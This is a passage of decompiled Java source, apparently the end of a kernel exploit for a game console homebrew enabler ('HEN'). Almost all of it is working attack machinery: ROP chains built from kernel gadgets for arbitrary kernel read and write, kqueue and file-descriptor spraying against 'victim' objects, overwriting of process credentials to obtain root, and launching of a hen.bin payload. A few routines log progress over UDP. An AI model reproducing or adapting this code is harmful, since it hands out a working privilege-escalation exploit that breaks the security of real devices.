            this.lg(unsafe, "H7 pthread_create rc=" + l153 + " handle=" + Hx1400.h16(unsafe.getLong(l152)));
            if (l153 == 0L) {
                this.lg(unsafe, "H7 *** hen.bin RUNNING - leaving it alone, no exit, no poll ***");
            }
            this.lg(unsafe, "H8 klog untouched by this probe - HEN owns it");
            int n59 = 0;
            int n60 = 0;
            for (n = 0; n < n27; ++n) {
                if (nArray4[n] <= 0) continue;
                ++n60;
                if (Hx1400.sx(this.ac(unsafe, l44, nArray4[n], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
                nArray4[n] = -1;
                ++n59;
            }
            if (n26 >= 0) {
                ++n60;
                if (Hx1400.sx(this.ac(unsafe, l44, n26, 0L, 0L, 0L, 0L, 0L)) == 0L) {
                    ++n59;
                }
            }
            if (l101 >= 0L) {
                ++n60;
                if (Hx1400.sx(this.ac(unsafe, l44, l101, 0L, 0L, 0L, 0L, 0L)) == 0L) {
                    ++n59;
                }
            }
            if (l8 >= 0L) {
                ++n60;
                if (Hx1400.sx(this.ac(unsafe, l44, l8, 0L, 0L, 0L, 0L, 0L)) == 0L) {
                    ++n59;
                }
            }
            for (n = 0; n < n29; ++n) {
                if (nArray6[n] <= 0) continue;
                ++n60;
                if (Hx1400.sx(this.ac(unsafe, l44, nArray6[n], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
                nArray6[n] = -1;
                ++n59;
            }
            this.cVs = null;
            this.cNv = 0;
            this.cAnchor = -1L;
            this.cKq = -1L;
            this.cDf = -1L;
            this.cPlugs = null;
            this.lg(unsafe, "H8 teardown: released " + n59 + "/" + n60 + " descriptors (victims safe - refcount is pinned)");
            this.lg(unsafe, "H8 kept: hen map " + Hx1400.hz(l149) + " fd " + l148 + ", blob map, fake page " + Hx1400.hz(l107) + " - hen.bin runs from one of them");
            this.lg(unsafe, "H8 *** the host process can now exit; HEN owns the console ***");
            this.cRs = null;
            this.cN = 0;
            this.cVs = null;
            this.cNv = 0;
            this.cAnchor = -1L;
            this.cKq = -1L;
            this.cDf = -1L;
            this.cPage = 0L;
            this.cTgt = -1L;
            this.lg(unsafe, "G kbase=" + Hx1400.h16(this.kbase) + " slot=" + Hx1400.h16(l116) + " ops=" + Hx1400.h16(l117));
            StringBuffer stringBuffer8 = new StringBuffer();
            stringBuffer8.append("HEN14V pid=").append(this.pid).append(" KBASE=").append(Hx1400.h16(this.kbase));
            stringBuffer8.append(" round=").append(n34).append(" arms=").append(n35);
            stringBuffer8.append(" pair=").append(n31).append("/").append(n32);
            stringBuffer8.append(" KVA=").append(Hx1400.h16(l109)).append(" victim=").append(n10);
            stringBuffer8.append(" bridge=").append(n41).append(" walked=").append(n6).append(" APPLIED=").append(n5 != 0 ? "1" : "0").append(" se11=").append(Hx1400.h16(l143));
            stringBuffer8.append(" UID=").append(l123).append(" uid2=").append(l145).append(l123 == 0L ? "  *** ROOT ***" : "");
            result = stringBuffer8.toString();
            this.lg(unsafe, "F: " + result);
            return result;
        }
        catch (Throwable throwable) {
            result = "THREW:" + throwable.getClass().getName() + ":" + throwable.getMessage();
            return result;
        }
    }

    void node(Unsafe unsafe, long l, long l2, long l3, long l4, int n, long l5) {
        unsafe.putLong(l, l2);
        unsafe.putLong(l + 8L, l3);
        unsafe.putLong(l + 16L, l4);
        unsafe.putInt(l + 24L, n);
        unsafe.putInt(l + 32L, (int)l5);
        unsafe.putByte(l + 36L, (byte)1);
        unsafe.putByte(l + 37L, (byte)1);
    }

    int w8(Unsafe unsafe, long l, int n, long l2) {
        unsafe.putLong(l + (long)n * 8L, l2);
        return n + 1;
    }

    static int hexv(char c) {
        return c <= '9' ? c - 48 : (c | 0x20) - 87;
    }

    long kbytes(Unsafe unsafe, long l, long l2, long l3, long l4, int n) {
        long l5 = l4 & 0xFFFFFFFFFFFFFFF8L;
        int n2 = (int)((l4 & 7L) * 8L);
        long l6 = this.kread(unsafe, l, l2, l3, l5) >>> n2;
        if ((l4 & 7L) + (long)n > 8L) {
            l6 |= this.kread(unsafe, l, l2, l3, l5 + 8L) << 64 - n2;
        }
        if (n == 1) {
            return l6 & 0xFFL;
        }
        if (n == 2) {
            return l6 & 0xFFFFL;
        }
        if (n == 4) {
            return l6 & 0xFFFFFFFFL;
        }
        return l6;
    }

    long cstr(Unsafe unsafe, String string) {
        long l = unsafe.allocateMemory((long)string.length() + 1L);
        unsafe.setMemory(l, (long)string.length() + 1L, (byte)0);
        for (int i = 0; i < string.length(); ++i) {
            unsafe.putByte(l + (long)i, (byte)string.charAt(i));
        }
        return l;
    }

    int kb0(Unsafe unsafe) {
        int n = 0;
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
        n = this.w8(unsafe, this.gSTACK, n, this.gCTX);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_SAVE));
        return n;
    }

    int kb1(Unsafe unsafe, int n) {
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
        n = this.w8(unsafe, this.gSTACK, n, 5570198814713989681L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
        n = this.w8(unsafe, this.gSTACK, n, this.gMARK);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRDIRAX));
        n = this.w8(unsafe, this.gSTACK, n, 0L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
        n = this.w8(unsafe, this.gSTACK, n, this.gCTX + 16L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_LDRAX));
        n = this.w8(unsafe, this.gSTACK, n, 0L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDX));
        n = this.w8(unsafe, this.gSTACK, n, -120L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_ADDRAX));
        n = this.w8(unsafe, this.gSTACK, n, 0L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
        n = this.w8(unsafe, this.gSTACK, n, this.gCTX + 8L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRDIRAX));
        n = this.w8(unsafe, this.gSTACK, n, 0L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_CONT));
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
        n = this.w8(unsafe, this.gSTACK, n, this.gCTX + 56L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRDIRAX));
        n = this.w8(unsafe, this.gSTACK, n, 0L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
        n = this.w8(unsafe, this.gSTACK, n, this.gCTX);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_REST));
        return n;
    }

    boolean kgo(Unsafe unsafe, long l, long l2, long l3, int n) {
        if (n > 112) {
            return false;
        }
        unsafe.putLong(this.gMARK, 0L);
        unsafe.setMemory(l2, 64L, (byte)0);
        unsafe.putLong(l2, this.gIDENT);
        unsafe.putShort(l2 + 8L, (short)-23);
        unsafe.putShort(l2 + 10L, (short)1);
        unsafe.putLong(l2 + 32L, this.ka(R_POPRSP));
        unsafe.putLong(l2 + 40L, this.gSTACK);
        this.ac(unsafe, l, l3, l2, 2L, 0L, 0L, 0L);
        return unsafe.getLong(this.gMARK) == 5570198814713989681L;
    }

    long kread(Unsafe unsafe, long l, long l2, long l3, long l4) {
        int n = this.kb0(unsafe);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
        n = this.w8(unsafe, this.gSTACK, n, l4);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_LDRAX));
        n = this.w8(unsafe, this.gSTACK, n, 0L);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
        n = this.w8(unsafe, this.gSTACK, n, this.gRES);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRDIRAX));
        n = this.w8(unsafe, this.gSTACK, n, 0L);
        n = this.kb1(unsafe, n);
        unsafe.putLong(this.gRES, 0L);
        if (!this.kgo(unsafe, l, l2, l3, n)) {
            return 0L;
        }
        return unsafe.getLong(this.gRES);
    }

    boolean kwrite(Unsafe unsafe, long l, long l2, long l3, long l4, long l5) {
        int n = this.kb0(unsafe);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
        n = this.w8(unsafe, this.gSTACK, n, l4);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDX));
        n = this.w8(unsafe, this.gSTACK, n, l5);
        n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRAXRDX));
        n = this.w8(unsafe, this.gSTACK, n, 0L);
        n = this.kb1(unsafe, n);
        return this.kgo(unsafe, l, l2, l3, n);
    }

    int uq(Unsafe unsafe, long l, int n, long l2, long l3) {
        n = this.w8(unsafe, l, n, this.ka(R_UCRED));
        n = this.w8(unsafe, l, n, 0L);
        n = this.w8(unsafe, l, n, this.ka(R_RAXRCX));
        n = this.w8(unsafe, l, n, 0L);
        n = this.w8(unsafe, l, n, this.ka(R_PRDX));
        n = this.w8(unsafe, l, n, l2);
        n = this.w8(unsafe, l, n, this.ka(R_ADDRAX));
        n = this.w8(unsafe, l, n, 0L);
        n = this.w8(unsafe, l, n, this.ka(R_PRDX));
        n = this.w8(unsafe, l, n, l3);
        n = this.w8(unsafe, l, n, this.ka(R_STRAXRDX));
        n = this.w8(unsafe, l, n, 0L);
        return n;
    }

    void safeDown(Unsafe unsafe, String string) {
        if (!this.cArmed) {
            this.lg(unsafe, string + " nothing armed");
            return;
        }
        this.cArmed = false;
        try {
            unsafe.putInt(this.cFake + 56L, 0x40000000);
            unsafe.putLong(this.cFake + 80L, 0L);
            unsafe.putLong(this.cFake + 88L, 0L);
            unsafe.setMemory(this.cFake + 2304L, 96L, (byte)0);
            unsafe.setMemory(this.cFake + 2560L, 96L, (byte)0);
            this.lg(unsafe, string + "1 fake pinned: ref=0x" + Integer.toHexString(unsafe.getInt(this.cFake + 56L)) + " srcs=" + Hx1400.h16(unsafe.getLong(this.cFake + 80L)) + " nsrc=" + unsafe.getLong(this.cFake + 88L));
            boolean bl = this.cPf != 0L && unsafe.getLong(this.cPf + 8L) == this.ka(R_RET0);
            boolean bl2 = false;
            if (this.cSlotA == 0L) {
                this.lg(unsafe, string + "2 the registry slot was never rotated on this run - nothing to restore");
                bl2 = true;
            } else if (bl && this.cSke != 0L && this.cEvB != 0L && this.cRkq >= 0 && this.gSTACK != 0L) {
                unsafe.putLong(this.cPf + 32L, this.ka(R_TOUCH));
                int n = this.kb0(unsafe);
                n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
                n = this.w8(unsafe, this.gSTACK, n, this.cSlotA);
                n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDX));
                n = this.w8(unsafe, this.gSTACK, n, this.cOpsV);
                n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRAXRDX));
                n = this.w8(unsafe, this.gSTACK, n, 0L);
                n = this.kb1(unsafe, n);
                bl2 = this.kgo(unsafe, this.cSke, this.cEvB, this.cRkq, n);
            }
            this.lg(unsafe, string + "2 sysfilt_ops restore=" + bl2 + " (fakeOps intact=" + bl + ")");
            if (this.cRkq >= 0 && this.cSke != 0L && this.cEvB != 0L) {
                unsafe.setMemory(this.cEvB, 64L, (byte)0);
                unsafe.putLong(this.cEvB, this.gIDENT);
                unsafe.putShort(this.cEvB + 8L, (short)-23);
                unsafe.putShort(this.cEvB + 10L, (short)2);
                long l = Hx1400.sx(this.ac(unsafe, this.cSke, this.cRkq, this.cEvB, 1L, 0L, 0L, 0L));
                long l2 = Hx1400.sx(this.ac(unsafe, this.cCl, this.cRkq, 0L, 0L, 0L, 0L, 0L));
                this.lg(unsafe, string + "3 knote delete=" + l + " bridge kq close=" + l2);
            } else {
                this.lg(unsafe, string + "3 no bridge kqueue on this run");
            }
            boolean bl3 = this.cCs != 0L && this.cMsav != 0L && Hx1400.sx(this.ac(unsafe, this.cCs, 3L, 1L, -1L, 16L, this.cMsav, 0L)) == 0L;
            this.lg(unsafe, string + "4 QUARANTINED LIVE on purpose: " + this.cNv + " victims + " + this.cN + " spray + anchor/dce stay open, page " + Hx1400.hz(this.cPage) + " stays mapped ; unpinned=" + bl3);
            this.lg(unsafe, string + "4 headroom = 0x3fffffff releases before the free branch is reachable");
            this.cRs = null;
            this.cN = 0;
            this.cVs = null;
            this.cNv = 0;
            this.cAnchor = -1L;
            this.cKq = -1L;
            this.cDf = -1L;
            this.cPage = 0L;
            this.cTgt = -1L;
            this.cPlugs = null;
        }
        catch (Throwable throwable) {
            this.lg(unsafe, string + "! safeDown threw " + throwable.getClass().getName());
        }
    }

    String fin(Unsafe unsafe, String string) {
        if (this.cArmed) {
            this.safeDown(unsafe, "FIN");
            result = "HEN14V STOP(armed): " + string;
            this.lg(unsafe, "F: " + result);
            return result;
        }
        int n = 0;
        try {
            if (this.cCl != 0L) {
                int n2;
                if (this.cVs != null) {
                    for (n2 = 0; n2 < this.cNv; ++n2) {
                        if (this.cVs[n2] <= 0) continue;
                        this.ac(unsafe, this.cCl, this.cVs[n2], 0L, 0L, 0L, 0L, 0L);
                        ++n;
                    }
                }
                if (this.cAnchor >= 0L) {
                    this.ac(unsafe, this.cCl, this.cAnchor, 0L, 0L, 0L, 0L, 0L);
                    ++n;
                }
                if (this.cDf >= 0L) {
                    this.ac(unsafe, this.cCl, this.cDf, 0L, 0L, 0L, 0L, 0L);
                    ++n;
                }
                if (this.cKq >= 0L) {
                    this.ac(unsafe, this.cCl, this.cKq, 0L, 0L, 0L, 0L, 0L);
                    ++n;
                }
                if (this.cTgt >= 0L && this.cMb != 0L) {
                    this.ac(unsafe, this.cSo, this.cTgt, 41L, 51L, this.cMb, 248L, 0L);
                }
                if (this.cPlugs != null) {
                    for (n2 = 0; n2 < this.cPlugs.length; ++n2) {
                        if (this.cPlugs[n2] <= 0) continue;
                        this.ac(unsafe, this.cCl, this.cPlugs[n2], 0L, 0L, 0L, 0L, 0L);
                    }
                }
                if (this.cRs != null) {
                    for (n2 = 0; n2 < this.cN; ++n2) {
                        if (this.cRs[n2] <= 0) continue;
                        this.ac(unsafe, this.cCl, this.cRs[n2], 0L, 0L, 0L, 0L, 0L);
                        ++n;
                    }
                }
            }
            if (this.cCs != 0L && this.cMsav != 0L) {
                this.ac(unsafe, this.cCs, 3L, 1L, -1L, 16L, this.cMsav, 0L);
            }
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        result = "HEN14V STOP: " + string + " (released " + n + " fds)";
        this.lg(unsafe, "F: " + result);
        return result;
    }

    int wash(Unsafe unsafe, long l, long l2, long l3, long l4, long l5, long l6, long l7, long l8, long l9, int n) {
        int n2;
        this.wFailAt = -1;
        this.wFailOp = "-";
        this.wRc = 0L;
        this.wBad = 0;
        this.wStuck = 0;
        for (n2 = 0; n2 < n; ++n2) {
            int n3;
            unsafe.setMemory(l6, 20L, (byte)0);
            long l10 = Hx1400.sx(this.ac(unsafe, l, 4097L, l5, 5L, 3L, l6, 0L));
            if (l10 != 0L) {
                this.wFailAt = n2;
                this.wFailOp = "submit";
                this.wRc = l10;
                break;
            }
            boolean bl = false;
            for (n3 = 0; n3 < 5; ++n3) {
                if (unsafe.getInt(l6 + (long)n3 * 4L) != 0) continue;
                bl = true;
            }
            if (bl) {
                this.wFailAt = n2;
                this.wFailOp = "zero-id";
                break;
            }
            unsafe.setMemory(l8, 20L, (byte)0);
            this.ac(unsafe, l2, l6, 5L, l8, 0L, 0L, 0L);
            n3 = 0;
            for (int i = 0; i < 4; ++i) {
                unsafe.setMemory(l9, 20L, (byte)0);
                this.ac(unsafe, l3, l6, 5L, l9, 0L, 0L, 0L);
                unsafe.setMemory(l7, 20L, (byte)0);
                this.ac(unsafe, l4, l6, 5L, l7, 0L, 0L, 0L);
                n3 = 0;
                for (int j = 0; j < 5; ++j) {
                    if (unsafe.getInt(l7 + (long)j * 4L) == 0) continue;
                    ++n3;
                    this.wBad = unsafe.getInt(l7 + (long)j * 4L);
                }
                if (n3 == 0) break;
            }
            if (n3 == 0) continue;
            ++this.wStuck;
        }
        this.wDone = n2;
        return n2;
    }

    String failStr() {
        if (this.wFailAt < 0) {
            return "clean stuck=" + this.wStuck;
        }
        return "op=" + this.wFailOp + " at=" + this.wFailAt + (this.wRc != 0L ? " rc=" + this.wRc : "") + (this.wBad != 0 ? " res=" + Hx1400.hz((long)this.wBad & 0xFFFFFFFFL) : "");
    }

    void parse(Unsafe unsafe, long l, long l2) {
        int n;
        this.lastBase = 0L;
        if (l2 <= 0L || l2 > 32768L) {
            return;
        }
        long l3 = 0L;
        int n2 = 0;
        boolean bl = false;
        boolean bl2 = false;
        long l4 = 0L;
        while (l4 + 16L <= l2 && (n = unsafe.getShort(l + l4) & 0xFFFF) >= 16 && l4 + (long)n <= l2) {
            if ((unsafe.getByte(l + l4 + 3L) & 0xFF) == 4 && n >= 40) {
                long l5;
                long l6 = (long)unsafe.getInt(l + l4 + 32L) & 0xFFFFFFFFL;
                long l7 = (long)unsafe.getInt(l + l4 + 36L) & 0xFFFFFFFFL;
                long l8 = l7 << 32 | l6;
                if (l7 == 0xFFFFFFFFL && l6 != 0L && l6 != 0xFFFFFFFFL && ((l5 = l8 - ANCHOR) & 0x3FFFL) == 0L && (l5 >>> 32 & 0xFFFFFFFFL) == 0xFFFFFFFFL) {
                    bl2 = true;
                    if (n2 == 0) {
                        l3 = l5;
                        n2 = 1;
                    } else if (l3 == l5) {
                        ++n2;
                    } else {
                        bl = true;
                    }
                }
            }
            l4 += (long)n;
        }
        if (bl2 && !bl) {
            this.lastBase = l3;
        }
    }

    boolean marked(Unsafe unsafe, long l, int n, long l2, long l3) {
        unsafe.setMemory(l2, 512L, (byte)0);
        unsafe.putInt(l3, 248);
        if (Hx1400.sx(this.ac(unsafe, l, n, 41L, 51L, l2, l3, 0L)) != 0L) {
            return false;
        }
        if (unsafe.getInt(l3) != 248) {
            return false;
        }
        return unsafe.getInt(l2 + 8L) == 0x43434343 && unsafe.getInt(l2 + 12L) == 0x54545454;
    }

    boolean meq(Unsafe unsafe, long l, long l2) {
        for (int i = 0; i < 16; ++i) {
            if (unsafe.getByte(l + (long)i) == unsafe.getByte(l2 + (long)i)) continue;
            return false;
        }
        return true;
    }

    void lg(Unsafe unsafe, String string) {
        if (LOGB.length() < 60000) {
            LOGB.append(string);
            LOGB.append('\n');
        }
        if (this.logB == 0L) {
            return;
        }
        int n = string.length();
        if (n > 200) {
            n = 200;
        }
        for (int i = 0; i < n; ++i) {
            unsafe.putByte(this.logB + (long)i, (byte)(string.charAt(i) & 0x7F));
        }
        unsafe.putByte(this.logB + (long)n, (byte)10);
        if (this.udpS >= 0L && this.lsto != 0L && this.logA != 0L) {
            this.ac(unsafe, this.lsto, this.udpS, this.logB, n + 1, 0L, this.logA, 16L);
        }
    }

    boolean chk(Unsafe unsafe, long l, int n) {
        try {
            if (l < 65536L) {
                return false;
            }
            if ((unsafe.getByte(l) & 0xFF) != 72) {
                return false;
            }
            if ((unsafe.getByte(l + 1L) & 0xFF) != 199) {
                return false;
            }
            if ((unsafe.getByte(l + 2L) & 0xFF) != 192) {
                return false;
            }
            if ((unsafe.getByte(l + 3L) & 0xFF) != (n & 0xFF)) {
                return false;
            }
            if ((unsafe.getByte(l + 4L) & 0xFF) != (n >>> 8 & 0xFF)) {
                return false;
            }
            if ((unsafe.getByte(l + 5L) & 0xFF) != (n >>> 16 & 0xFF)) {
                return false;
            }
            if ((unsafe.getByte(l + 6L) & 0xFF) != (n >>> 24 & 0xFF)) {
                return false;
            }
            if ((unsafe.getByte(l + 7L) & 0xFF) != 73) {
                return false;
            }
            if ((unsafe.getByte(l + 8L) & 0xFF) != 137) {
                return false;
            }
            if ((unsafe.getByte(l + 9L) & 0xFF) != 202) {
                return false;
            }
            if ((unsafe.getByte(l + 10L) & 0xFF) != 15) {
                return false;
            }
            return (unsafe.getByte(l + 11L) & 0xFF) == 5;
        }
        catch (Throwable throwable) {
            return false;
        }
    }

    long ac(Unsafe unsafe, long l, long l2, long l3, long l4, long l5, long l6, long l7) {
        long l8 = 0L;
        for (int i = 0; i < 2; ++i) {
            unsafe.putLong(this.lkf + 16L, this.lvf);
            unsafe.putLong(this.lkf + 32L, this.lvf);
            unsafe.putLong(this.lkf + 184L, 0L);
            unsafe.putLong(this.lvf + 560L, i == 0 ? this.lsj + 35L : this.lsc + 57L);
            unsafe.putLong(pM + 120L, pF);
            l8 = this.nativeCall(this.lof, DM);
            unsafe.putLong(pM + 120L, pO);
            if (l8 != 0L && l8 > 65536L) {
                unsafe.putLong(l8 + 8L, rAK);
                unsafe.putLong(l8 + 24L, 0L);
            }
            if (i != 0) continue;
            long l9 = unsafe.getLong(this.lkf + 40L);
            long l10 = unsafe.getLong(this.lkf + 48L);
            long l11 = unsafe.getLong(this.lkf + 56L);
            long l12 = unsafe.getLong(this.lkf + 64L);
            long l13 = unsafe.getLong(this.lkf + 72L);
            long l14 = unsafe.getLong(this.lkf + 80L);
            long l15 = unsafe.getLong(this.lkf + 88L);
            unsafe.putLong(this.lkf + 104L, l2);
            unsafe.putLong(this.lkf + 112L, l3);
            unsafe.putLong(this.lkf + 120L, l4);
            unsafe.putLong(this.lkf + 128L, l5);
            unsafe.putLong(this.lkf + 136L, l6);
            unsafe.putLong(this.lkf + 144L, l7);
            unsafe.putLong(this.lkf + 160L, l9);
            unsafe.putLong(this.lkf + 168L, l11);
            unsafe.putLong(this.lkf + 192L, l12);
            unsafe.putLong(this.lkf + 200L, l13);
            unsafe.putLong(this.lkf + 208L, l14);
            unsafe.putLong(this.lkf + 216L, l15);
            unsafe.putLong(this.lkf + 256L, l);
            unsafe.putLong(this.lkf + 280L, l10);
        }
        if (l8 == 0L) {
            return 0L;
        }
        if (l8 < 65536L) {
            return l8;
        }
        return unsafe.getLong(l8);
    }

    static {
        HENURL = null;
        LOGB = new StringBuffer();
        CANDS = new int[]{128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240};
    }
}
